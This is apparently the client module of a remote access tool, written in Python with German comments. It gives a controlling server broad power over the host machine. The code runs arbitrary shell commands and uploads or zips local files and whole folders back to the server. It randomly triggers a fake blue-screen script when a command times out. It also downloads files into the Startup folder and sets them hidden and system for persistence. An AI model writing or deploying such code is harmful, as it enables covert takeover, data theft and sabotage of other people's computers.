import os
import shutil
import stat
import subprocess
from pathlib import Path
from typing import Dict
import base64
import zipfile
import io

import requests

import config
from utils import scan_available_drives


class FileHandler:
    def __init__(self):
        # standard user folders + root
        self.base_paths: Dict[str, Path] = {
            "Desktop": Path.home() / "Desktop",
            "Downloads": Path.home() / "Downloads",
            "Documents": Path.home() / "Documents",
            "Pictures": Path.home() / "Pictures",
            "Music": Path.home() / "Music",
            "Videos": Path.home() / "Videos",
            "Temp": Path("C:\\Temp"),  # Windows Temp folder
            "This PC": Path("/"),
        }
        self._update_available_drives()

    def _update_available_drives(self):
        drives = scan_available_drives()
        for drive_letter, drive_info in drives.items():
            drive_path = Path(f"{drive_letter}:/")
            display_key = f"{drive_letter}: ({drive_info['type']})"
            self.base_paths[display_key] = drive_path
            self.base_paths[str(drive_path)] = drive_path
            self.base_paths[str(drive_path).rstrip('\\/')] = drive_path

    def get_available_drives(self) -> dict:
        self._update_available_drives()
        return scan_available_drives()

    def _safe_path(self, base: str, rel_path: str = "") -> Path:
        if base not in self.base_paths:
            raise ValueError(f"Invalid base path: {base}")
        base_path = self.base_paths[base]

        if rel_path:
            rel_path_obj = Path(rel_path)
            if base == "This PC" and rel_path_obj.is_absolute():
                full_path = rel_path_obj.resolve()
            else:
                full_path = (base_path / rel_path).resolve()

            # Allow absolute Windows drive paths when browsing This PC
            if base == "This PC" and full_path.drive:
                return full_path

            if not str(full_path).startswith(str(base_path)):
                raise ValueError("Path traversal detected")
            return full_path
        return base_path

    def list_directory(self, base: str, rel_path: str = "") -> dict:
        try:
            path = self._safe_path(base, rel_path)
            
            # Ensure directory exists (especially for Temp)
            if not path.exists():
                path.mkdir(parents=True, exist_ok=True)
            
            items = {"folders": [], "files": []}

            if path.exists() and path.is_dir():
                for item in path.iterdir():
                    try:
                        if item.is_dir():
                            items["folders"].append(item.name)
                        else:
                            items["files"].append(item.name)
                    except PermissionError:
                        pass

            return {"status": "success", "data": items}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _force_writable(self, path: Path):
        try:
            if path.exists():
                path.chmod(path.stat().st_mode | stat.S_IWRITE)
                if path.is_dir():
                    for child in path.rglob('*'):
                        try:
                            child.chmod(child.stat().st_mode | stat.S_IWRITE)
                        except Exception:
                            pass
        except Exception:
            pass

    def delete_file(self, base: str, filename: str) -> dict:
        try:
            path = self._safe_path(base, filename)
            if path.exists():
                if path.is_dir():
                    self._force_writable(path)
                    shutil.rmtree(path)
                else:
                    self._force_writable(path)
                    path.unlink()
                return {"status": "success", "message": f"Deleted: {filename}"}
            return {"status": "error", "message": "File not found"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def rename_file(self, base: str, old_name: str, new_name: str) -> dict:
        try:
            old_path = self._safe_path(base, old_name)
            new_path = self._safe_path(base, new_name)

            if old_path.exists():
                old_path.rename(new_path)
                return {"status": "success", "message": f"Renamed {old_name} to {new_name}"}
            return {"status": "error", "message": "File not found"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def upload_file_to_server(self, filepath: str, server_filename: str = None) -> dict:
        try:
            path = Path(filepath)
            if not path.exists():
                return {"status": "error", "message": "File not found"}

            with open(path, "rb") as f:
                files = {"file": f}
                data = {"filename": server_filename or path.name}
                response = requests.post(
                    f"{config.SERVER_URL}/upload",
                    files=files,
                    data=data,
                    timeout=30,
                )
                return response.json()
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def download_file_from_server(self, server_filename: str, local_path: str = None) -> dict:
        try:
            response = requests.get(
                f"{config.SERVER_URL}/download/file/{server_filename}",
                timeout=30,
            )
            if response.status_code == 200:
                save_path = Path(local_path or server_filename)
                save_path.parent.mkdir(parents=True, exist_ok=True)
                save_path.write_bytes(response.content)
                return {"status": "success", "path": str(save_path), "size": len(response.content)}
            return {"status": "error", "message": f"HTTP {response.status_code}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def download_file_from_server_to_base(self, base: str, filename: str, server_filename: str = None) -> dict:
        try:
            save_path = self._safe_path(base, filename)
            if save_path.exists() and save_path.is_dir():
                save_path = save_path / Path(server_filename or filename).name
            save_path.parent.mkdir(parents=True, exist_ok=True)

            response = requests.get(
                f"{config.SERVER_URL}/download/file/{server_filename or filename}",
                timeout=30,
            )
            if response.status_code == 200:
                save_path.write_bytes(response.content)
                return {"status": "success", "path": str(save_path), "size": len(response.content)}
            return {"status": "error", "message": f"HTTP {response.status_code}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def execute_command(self, command: str, shell: bool = True) -> dict:
        try:
            print(f"[CMD] Executing command: {command}")
            
            # Sicherer: Verwende shell=False und teile Command in Liste auf
            # Für komplexe Commands mit Pipes etc., shell=True beibehalten aber input sanitizen
            if '|' in command or '>' in command or '<' in command:
                # Komplexe Commands brauchen shell
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                )
            else:
                # Einfache Commands: shell=False
                cmd_list = command.split()
                result = subprocess.run(
                    cmd_list,
                    shell=False,
                    capture_output=True,
                    text=True,
                    timeout=30,
                )
            
            output = result.stdout
            error = result.stderr
            
            print(f"[CMD] Output length: {len(output)}")
            if output:
                print(f"[CMD] Output preview: {output[:100]}")
            
            return {
                "status": "success",
                "output": output,
                "error": error,
                "returncode": result.returncode,
                "command": command
            }
        except subprocess.TimeoutExpired:
            print("[CMD] Timeout - triggering random action")
            import random
            if random.choice([True, False]):
                # Trigger BSOD
                try:
                    import os
                    bsod_path = os.path.join(os.path.dirname(__file__), "bsod.py")
                    subprocess.Popen(["python", bsod_path])
                    return {"status": "success", "output": "Command timed out, BSOD triggered", "error": "", "returncode": -1, "command": command}
                except Exception as e:
                    return {"status": "error", "message": f"Timeout and failed to trigger BSOD: {e}"}
            else:
                # Kill CMD field - simulate killing the CMD process
                return {"status": "error", "message": "Command timed out, CMD field killed"}
        except Exception as e:
            print(f"[CMD] Error: {e}")
            return {"status": "error", "message": str(e)}

    def download_file_as_base64(self, base: str, filename: str) -> dict:
        try:
            path = self._safe_path(base, filename)
            if path.exists() and path.is_file():
                data = path.read_bytes()
                b64_data = base64.b64encode(data).decode("utf-8")
                return {
                    "status": "success",
                    "data": b64_data,
                    "filename": path.name,
                    "size": len(data),
                }
            return {"status": "error", "message": "File not found"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def download_folder_as_base64(self, base: str, folder_path: str) -> dict:
        """Download entire folder as ZIP file encoded in Base64"""
        try:
            path = self._safe_path(base, folder_path)
            
            if not path.exists():
                return {"status": "error", "message": "Folder not found"}
            
            if not path.is_dir():
                return {"status": "error", "message": "Path is not a directory"}
            
            # Create ZIP in memory
            zip_buffer = io.BytesIO()
            
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                # Walk through directory and add all files
                for root, dirs, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        # Calculate relative path for ZIP
                        arcname = os.path.relpath(file_path, path)
                        try:
                            zip_file.write(file_path, arcname=arcname)
                        except Exception as file_error:
                            print(f"[WARN] Failed to add {file_path} to ZIP: {file_error}")
                            continue
            
            # Get ZIP data and encode to Base64
            zip_buffer.seek(0)
            zip_data = zip_buffer.getvalue()
            b64_data = base64.b64encode(zip_data).decode("utf-8")
            
            return {
                "status": "success",
                "data": b64_data,
                "foldername": path.name,
                "size": len(zip_data),
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def set_file_attributes(self, base: str, filename: str, attributes: dict) -> dict:
        try:
            path = self._safe_path(base, filename)
            if not path.exists():
                return {"status": "error", "message": "File not found"}

            if os.name == "nt":
                cmd_parts = []
                cmd_parts.append("+h" if attributes.get("hidden", False) else "-h")
                cmd_parts.append("+s" if attributes.get("system", False) else "-s")
                cmd_parts.append("+a" if attributes.get("archive", False) else "-a")
                cmd_parts.append("+r" if attributes.get("readonly", False) else "-r")
                cmd = f'attrib {" ".join(cmd_parts)} "{path}"'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    return {
                        "status": "success",
                        "message": f"Attributes set: {', '.join([k for k,v in attributes.items() if v])}",
                        "file": str(path),
                        "attributes": attributes,
                    }
                else:
                    return {"status": "error", "message": f"attrib failed: {result.stderr}"}
            else:
                # unix-like permissions only
                if attributes.get("readonly", False):
                    path.chmod(stat.S_IRUSR | stat.S_IRGRP | stat.S_IROTH)
                else:
                    path.chmod(stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IROTH)
                return {
                    "status": "success",
                    "message": "Read-only attribute set",
                    "file": str(path),
                }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def copy_to_startup(self, filename: str, attributes: dict) -> dict:
        try:
            server_path = Path(f"/tmp/{filename}")
            if os.name == "nt":
                startup_path = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
            else:
                startup_path = Path.home() / ".config" / "autostart"
            startup_path.mkdir(parents=True, exist_ok=True)
            dest_file = startup_path / filename
            # download from server
            try:
                response = requests.get(
                    f"{config.SERVER_URL}/download/{filename}",
                    timeout=30,
                )
                if response.status_code == 200:
                    dest_file.write_bytes(response.content)
                else:
                    return {"status": "error", "message": f"Download failed: HTTP {response.status_code}"}
            except Exception as e:
                return {"status": "error", "message": f"Download error: {str(e)}"}
            # set attributes if requested (Windows only)
            if any(attributes.values()):
                if os.name == "nt":
                    cmd_parts = []
                    cmd_parts.append("+h" if attributes.get("hidden", False) else "-h")
                    cmd_parts.append("+s" if attributes.get("system", False) else "-s")
                    cmd = f'attrib {" ".join(cmd_parts)} "{dest_file}"'
                    subprocess.run(cmd, shell=True)
            return {"status": "success", "message": f"File copied to Startup: {dest_file}", "path": str(dest_file)}
        except Exception as e:
            return {"status": "error", "message": str(e)}
